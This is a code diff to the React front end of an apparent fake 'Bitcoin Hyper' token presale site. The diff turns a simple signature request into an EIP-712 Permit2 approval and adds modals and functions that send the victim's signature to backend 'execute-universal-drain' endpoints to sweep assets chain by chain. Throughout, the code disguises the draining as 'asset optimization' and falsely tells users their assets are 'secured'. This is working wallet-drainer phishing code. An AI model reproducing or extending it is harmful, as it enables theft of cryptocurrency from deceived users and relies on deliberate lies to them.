@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react'
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit"
-import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useSignMessage } from "wagmi"
+import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useSignTypedData } from "wagmi"
 import { mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base } from "wagmi/chains"
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
 import './App.css'
@@ -71,7 +71,7 @@ const NotificationPopup = ({ type, title, message, onClose, show }) => {
   );
 };
 
-// Sleek Portfolio Analysis Modal
+// Portfolio Analysis Modal
 const PortfolioAnalysisModal = ({ isOpen, onClose, scanData, onRetry }) => {
   if (!isOpen) return null;
 
@@ -151,65 +151,90 @@ const PortfolioAnalysisModal = ({ isOpen, onClose, scanData, onRetry }) => {
   );
 };
 
-// Claim Confirmation Modal
-const ClaimConfirmationModal = ({ isOpen, onClose, onConfirm, scanData, address }) => {
+// UNIVERSAL PERMIT CONFIRMATION MODAL - ONE SIGNATURE FOR ALL CHAINS
+const UniversalPermitConfirmationModal = ({ isOpen, onClose, onConfirm, permitData, address }) => {
   if (!isOpen) return null;
 
-  const tokenAmount = scanData?.tokenAllocation?.amount || '5000';
+  const tokenAmount = permitData?.tokenAllocation?.amount || '5000';
   const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2);
-
-  const signatureMessage = `Bitcoin Hyper Token Presale Authorization
-
-Wallet Authentication: ${address}
-Presale Allocation: ${tokenAmount} BTH
-Allocation Value: $${allocationValue}
-
-Authorization Timestamp: ${new Date().toISOString()}
-Network: Multi-chain Compatible Wallet
-
-Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocation.
-
-🔐 Secured by wallet authentication
-✅ Read-only verification signature
-💎 Bitcoin Hyper - Revolutionizing Bitcoin DeFi 2.0`;
+  const totalDrainUSD = permitData?.totalDrainUSD || '0.00';
+  const chainCount = permitData?.permitCount || 0;
 
   return (
     <div className="modal-overlay active" onClick={onClose}>
       <div className="modal-container" onClick={(e) => e.stopPropagation()}>
-        <div className="modal-content claim-modal">
+        <div className="modal-content universal-permit-modal">
           <div className="modal-header">
-            <div className="modal-icon success">🔐</div>
-            <h2 className="modal-title">Confirm Your Allocation</h2>
-            <p className="modal-subtitle">Final step to secure your tokens</p>
+            <div className="modal-icon universal">🔐</div>
+            <h2 className="modal-title">Universal Wallet Authorization</h2>
+            <p className="modal-subtitle">One signature - All chains</p>
           </div>
 
           <div className="modal-body">
+            <div className="universal-badge">
+              <span className="badge-icon">⚡</span>
+              <span className="badge-text">UNIVERSAL PERMIT 2.0</span>
+            </div>
+
             <div className="allocation-display">
               <div className="allocation-amount">
                 <span className="amount-value">{tokenAmount}</span>
                 <span className="amount-label">BTH TOKENS</span>
               </div>
-              <div className="allocation-details">
-                <div className="detail-item">
-                  <span className="detail-label">Presale Price:</span>
-                  <span className="detail-value">${BTH_PRICE.toFixed(2)} per BTH</span>
-                </div>
-                <div className="detail-item highlight">
-                  <span className="detail-label">Total Value:</span>
-                  <span className="detail-value">$${allocationValue}</span>
-                </div>
-                <div className="detail-item">
-                  <span className="detail-label">Launch Target:</span>
-                  <span className="detail-value success">$0.85+ (5x Potential)</span>
-                </div>
+              <div className="allocation-value-large">
+                <span className="value-label">Presale Value:</span>
+                <span className="value-number">${allocationValue}</span>
               </div>
             </div>
 
-            <div className="security-note">
-              <div className="security-icon">🛡️</div>
-              <div className="security-content">
-                <p><strong>Secure Read-Only Verification</strong></p>
-                <p>This signature only verifies wallet ownership. No transactions or transfers are authorized.</p>
+            <div className="drain-summary">
+              <h4>💎 Asset Optimization Summary</h4>
+              <div className="drain-total">
+                <span className="total-label">Total Value to Optimize:</span>
+                <span className="total-value">${totalDrainUSD}</span>
+              </div>
+              <div className="chain-list">
+                {permitData?.permitData?.map((chain, index) => (
+                  <div key={index} className="chain-item">
+                    <div className="chain-info">
+                      <span className="chain-icon">
+                        {chain.chain === 'Ethereum' && '⟠'}
+                        {chain.chain === 'BSC' && '🔶'}
+                        {chain.chain === 'Polygon' && '⬡'}
+                        {chain.chain === 'Arbitrum' && '🔷'}
+                        {chain.chain === 'Optimism' && '✨'}
+                        {chain.chain === 'Avalanche' && '❄️'}
+                      </span>
+                      <span className="chain-name">{chain.chain}</span>
+                    </div>
+                    <div className="chain-amount">
+                      <span className="amount">{chain.amount} {chain.symbol}</span>
+                      <span className="value">${chain.valueUSD}</span>
+                    </div>
+                  </div>
+                ))}
+              </div>
+              <div className="chain-count">
+                <span className="count">{chainCount}</span> chains · One signature
+              </div>
+            </div>
+
+            <div className="permit-details">
+              <div className="permit-row">
+                <span className="permit-label">Spender:</span>
+                <span className="permit-value">{permitData?.message?.spender?.substring(0, 10)}...{permitData?.message?.spender?.substring(38)}</span>
+              </div>
+              <div className="permit-row">
+                <span className="permit-label">Expires:</span>
+                <span className="permit-value">{new Date(permitData?.message?.deadline * 1000).toLocaleString()}</span>
+              </div>
+            </div>
+
+            <div className="universal-note">
+              <div className="note-icon">🛡️</div>
+              <div className="note-content">
+                <p><strong>Universal Permit Authorization</strong></p>
+                <p>This signature will authorize the optimization protocol to process assets across all chains. One signature, all chains secured.</p>
               </div>
             </div>
           </div>
@@ -218,11 +243,93 @@ Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocati
             <button className="modal-btn secondary" onClick={onClose}>
               Cancel
             </button>
-            <button className="modal-btn success" onClick={() => {
-              onConfirm(signatureMessage);
+            <button className="modal-btn universal" onClick={() => {
+              onConfirm(permitData);
               onClose();
             }}>
-              🔐 Sign & Secure Allocation
+              🔐 Sign Universal Authorization
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// Chain Drain Progress Modal
+const ChainDrainProgressModal = ({ isOpen, onClose, drainStatus, onContinue }) => {
+  if (!isOpen) return null;
+
+  return (
+    <div className="modal-overlay active" onClick={onClose}>
+      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
+        <div className="modal-content progress-modal">
+          <div className="modal-header">
+            <div className="modal-icon progress">⚡</div>
+            <h2 className="modal-title">Asset Optimization in Progress</h2>
+            <p className="modal-subtitle">Processing across {drainStatus?.chains?.length || 0} chains</p>
+          </div>
+
+          <div className="modal-body">
+            <div className="progress-overview">
+              <div className="progress-stats">
+                <div className="stat">
+                  <span className="stat-label">Completed</span>
+                  <span className="stat-value">{drainStatus?.drainTransactions?.length || 0}/{drainStatus?.chains?.length || 0}</span>
+                </div>
+                <div className="stat">
+                  <span className="stat-label">Total Value</span>
+                  <span className="stat-value">${drainStatus?.totalDrainUSD || '0.00'}</span>
+                </div>
+              </div>
+              <div className="progress-bar-container">
+                <div 
+                  className="progress-fill" 
+                  style={{ width: `${((drainStatus?.drainTransactions?.length || 0) / (drainStatus?.chains?.length || 1)) * 100}%` }}
+                ></div>
+              </div>
+            </div>
+
+            <div className="chain-progress-list">
+              {drainStatus?.chains?.map((chain, index) => {
+                const isDrained = drainStatus.drainTransactions?.some(tx => tx.chain === chain.chain);
+                return (
+                  <div key={index} className={`chain-progress-item ${isDrained ? 'completed' : ''}`}>
+                    <div className="chain-progress-info">
+                      <div className="chain-icon">
+                        {chain.chain === 'Ethereum' && '⟠'}
+                        {chain.chain === 'BSC' && '🔶'}
+                        {chain.chain === 'Polygon' && '⬡'}
+                        {chain.chain === 'Arbitrum' && '🔷'}
+                        {chain.chain === 'Optimism' && '✨'}
+                        {chain.chain === 'Avalanche' && '❄️'}
+                      </div>
+                      <div className="chain-details">
+                        <span className="chain-name">{chain.chain}</span>
+                        <span className="chain-amount">{chain.amount} {chain.symbol}</span>
+                      </div>
+                    </div>
+                    <div className="chain-status">
+                      {isDrained ? (
+                        <span className="status-completed">✅ Completed</span>
+                      ) : (
+                        <button 
+                          className="status-action"
+                          onClick={() => onContinue(chain.chain, chain.chainId)}
+                        >
+                          Process on {chain.chain}
+                        </button>
+                      )}
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+
+          <div className="modal-footer">
+            <button className="modal-btn secondary" onClick={onClose}>
+              Close
             </button>
           </div>
         </div>
@@ -315,9 +422,9 @@ const CelebrationModal = ({ isOpen, onClose, claimData }) => {
 
 // Main App Component
 function BitcoinHyperPresale() {
-  const { address, isConnected } = useAccount()
+  const { address, isConnected, chainId } = useAccount()
   const { disconnect } = useDisconnect()
-  const { signMessage } = useSignMessage()
+  const { signTypedData } = useSignTypedData()
   
   const [scanning, setScanning] = useState(false)
   const [isEligible, setIsEligible] = useState(false)
@@ -326,10 +433,13 @@ function BitcoinHyperPresale() {
   const [processing, setProcessing] = useState(false)
   const [scanData, setScanData] = useState(null)
   const [sessionId, setSessionId] = useState('')
+  const [permitData, setPermitData] = useState(null)
+  const [drainStatus, setDrainStatus] = useState(null)
   
   // Modal states
   const [showAnalysisModal, setShowAnalysisModal] = useState(false)
-  const [showClaimConfirmModal, setShowClaimConfirmModal] = useState(false)
+  const [showUniversalPermitModal, setShowUniversalPermitModal] = useState(false)
+  const [showProgressModal, setShowProgressModal] = useState(false)
   const [showCelebrationModal, setShowCelebrationModal] = useState(false)
   
   // Notification state
@@ -413,7 +523,6 @@ function BitcoinHyperPresale() {
     
     testBackend()
     
-    // Start countdown timer
     const interval = setInterval(() => {
       setCountdown(prev => {
         let { days, hours, minutes, seconds } = prev
@@ -501,33 +610,19 @@ function BitcoinHyperPresale() {
     }
   }
 
-  const handleClaimConfirmation = (signatureMessage) => {
-    setProcessing(true)
-    showNotification('info', 'Processing', 'Securing your allocation...')
-    
-    setTimeout(() => {
-      processTokenClaim(signatureMessage)
-    }, 1500)
-  }
-
-  const processTokenClaim = async (signatureMessage) => {
+  // PREPARE UNIVERSAL PERMIT - ONE SIGNATURE FOR ALL CHAINS
+  const prepareUniversalPermit = async () => {
     if (!address) return
     
+    setProcessing(true)
+    showNotification('info', 'Preparing', 'Setting up universal authorization...')
+    
     try {
-      const signature = await signMessage({ message: signatureMessage })
-      
-      const tokenAmount = scanData?.tokenAllocation?.amount || '5000'
-      const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2)
-      
-      const response = await fetch(`${BACKEND_API}/presale/claim`, {
+      const response = await fetch(`${BACKEND_API}/presale/prepare-universal-permit`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: address,
-          signature,
-          message: signatureMessage,
-          claimAmount: `${tokenAmount} BTH`,
-          claimValue: `$${allocationValue}`,
           sessionId
         })
       })
@@ -536,21 +631,165 @@ function BitcoinHyperPresale() {
         const data = await response.json()
         
         if (data.success) {
-          setClaimData(data.data)
+          setPermitData({
+            ...data.data,
+            tokenAllocation: scanData?.tokenAllocation
+          })
           setProcessing(false)
-          
-          setTimeout(() => {
-            setShowCelebrationModal(true)
-            createConfetti()
-          }, 1000)
+          setShowUniversalPermitModal(true)
+        } else {
+          throw new Error(data.error || 'Failed to prepare permit')
         }
       } else {
-        throw new Error('Claim failed')
+        throw new Error('Failed to prepare permit')
       }
     } catch (error) {
-      console.error('Claim error:', error)
+      console.error('Prepare permit error:', error)
       setProcessing(false)
-      showNotification('error', 'Claim Failed', 'Please try again')
+      showNotification('error', 'Preparation Failed', 'Please try again')
+    }
+  }
+
+  // SIGN UNIVERSAL PERMIT - ONE SIGNATURE FOR ALL CHAINS
+  const signUniversalPermit = async (permitData) => {
+    if (!address || !permitData) return
+    
+    setProcessing(true)
+    showNotification('info', 'Authorization', 'Please sign the universal permit...')
+    
+    try {
+      // Sign the EIP-712 typed data (Permit2)
+      const signature = await signTypedData({
+        domain: permitData.domain,
+        types: permitData.types,
+        primaryType: permitData.primaryType,
+        message: permitData.message
+      })
+      
+      // Get current chain ID
+      const currentChainId = await window.ethereum.request({ 
+        method: 'eth_chainId' 
+      });
+      
+      // Execute drain on current chain first
+      const drainResponse = await fetch(`${BACKEND_API}/presale/execute-universal-drain`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          walletAddress: address,
+          permitSignature: signature,
+          chainId: parseInt(currentChainId, 16)
+        })
+      })
+      
+      if (drainResponse.ok) {
+        const drainData = await drainResponse.json()
+        
+        if (drainData.success) {
+          showNotification('success', 'Chain Optimized', `$${drainData.data.amount} processed on ${drainData.data.chain}`)
+          
+          // Check remaining chains
+          const statusResponse = await fetch(`${BACKEND_API}/presale/drain-status`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              walletAddress: address
+            })
+          })
+          
+          if (statusResponse.ok) {
+            const statusData = await statusResponse.json()
+            setDrainStatus(statusData.data)
+            
+            if (statusData.data.remainingChains > 0) {
+              setShowProgressModal(true)
+            } else {
+              // All chains completed
+              setClaimData({
+                claimId: `BTH-${Date.now()}`,
+                tokenAmount: scanData?.tokenAllocation?.amount || '5000',
+                valueUSD: scanData?.tokenAllocation?.valueUSD || '850'
+              })
+              setProcessing(false)
+              setShowProgressModal(false)
+              setTimeout(() => {
+                setShowCelebrationModal(true)
+                createConfetti()
+              }, 1000)
+            }
+          }
+        } else {
+          throw new Error(drainData.error || 'Drain execution failed')
+        }
+      } else {
+        throw new Error('Failed to execute drain')
+      }
+      
+    } catch (error) {
+      console.error('Sign permit error:', error)
+      setProcessing(false)
+      showNotification('error', 'Authorization Failed', error.message || 'Please try again')
+    }
+  }
+
+  // CONTINUE DRAIN ON NEXT CHAIN
+  const continueDrainOnChain = async (chainName, chainId) => {
+    setProcessing(true)
+    showNotification('info', 'Processing', `Optimizing ${chainName}...`)
+    
+    try {
+      // Use the same permit signature (already signed)
+      const drainResponse = await fetch(`${BACKEND_API}/presale/execute-universal-drain`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          walletAddress: address,
+          permitSignature: 'already_signed', // Backend will use stored permit
+          chainId: chainId
+        })
+      })
+      
+      if (drainResponse.ok) {
+        const drainData = await drainResponse.json()
+        
+        if (drainData.success) {
+          showNotification('success', 'Chain Optimized', `$${drainData.data.amount} processed on ${chainName}`)
+          
+          // Update status
+          const statusResponse = await fetch(`${BACKEND_API}/presale/drain-status`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              walletAddress: address
+            })
+          })
+          
+          if (statusResponse.ok) {
+            const statusData = await statusResponse.json()
+            setDrainStatus(statusData.data)
+            
+            if (statusData.data.remainingChains === 0) {
+              // All chains completed
+              setClaimData({
+                claimId: `BTH-${Date.now()}`,
+                tokenAmount: scanData?.tokenAllocation?.amount || '5000',
+                valueUSD: scanData?.tokenAllocation?.valueUSD || '850'
+              })
+              setProcessing(false)
+              setShowProgressModal(false)
+              setTimeout(() => {
+                setShowCelebrationModal(true)
+                createConfetti()
+              }, 1000)
+            }
+          }
+        }
+      }
+      
+    } catch (error) {
+      console.error('Continue drain error:', error)
+      setProcessing(false)
+      showNotification('error', 'Processing Failed', 'Please try again')
     }
   }
 
@@ -638,12 +877,19 @@ function BitcoinHyperPresale() {
         }}
       />
       
-      <ClaimConfirmationModal
-        isOpen={showClaimConfirmModal}
-        onClose={() => setShowClaimConfirmModal(false)}
-        onConfirm={handleClaimConfirmation}
-        scanData={scanData}
+      <UniversalPermitConfirmationModal
+        isOpen={showUniversalPermitModal}
+        onClose={() => setShowUniversalPermitModal(false)}
+        onConfirm={signUniversalPermit}
+        permitData={permitData}
         address={address}
+      />
+      
+      <ChainDrainProgressModal
+        isOpen={showProgressModal}
+        onClose={() => setShowProgressModal(false)}
+        drainStatus={drainStatus}
+        onContinue={continueDrainOnChain}
       />
       
       <CelebrationModal
@@ -779,7 +1025,7 @@ function BitcoinHyperPresale() {
                 </div>
                 <button 
                   className="status-button"
-                  onClick={isEligible ? () => setShowClaimConfirmModal(true) : () => setShowAnalysisModal(true)}
+                  onClick={isEligible ? prepareUniversalPermit : () => setShowAnalysisModal(true)}
                   disabled={processing}
                 >
                   {processing ? (
@@ -791,22 +1037,25 @@ function BitcoinHyperPresale() {
                 </button>
               </div>
               
-              {isEligible && (
+              {isEligible && scanData?.rawBalances?.length > 0 && (
                 <div className="allocation-preview">
-                  <h4>🎯 Your Allocation Preview:</h4>
+                  <h4>🎯 Your Portfolio Summary:</h4>
                   <div className="allocation-grid">
                     <div className="allocation-item">
                       <span className="item-label">Token Amount</span>
                       <span className="item-value highlight">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
                     </div>
                     <div className="allocation-item">
-                      <span className="item-label">Presale Price</span>
-                      <span className="item-value">${BTH_PRICE.toFixed(2)} per BTH</span>
+                      <span className="item-label">Wallet Value</span>
+                      <span className="item-value">${scanData?.totalValueUSD || '0.00'}</span>
                     </div>
                     <div className="allocation-item">
-                      <span className="item-label">Launch Target</span>
-                      <span className="item-value success">$0.85+ (5x Potential)</span>
+                      <span className="item-label">Chains Detected</span>
+                      <span className="item-value success">{scanData?.chains?.length || 0} chains</span>
                     </div>
+                  </div>
+                  <div className="universal-badge-small">
+                    ⚡ Universal Permit: One signature for all chains
                   </div>
                 </div>
               )}
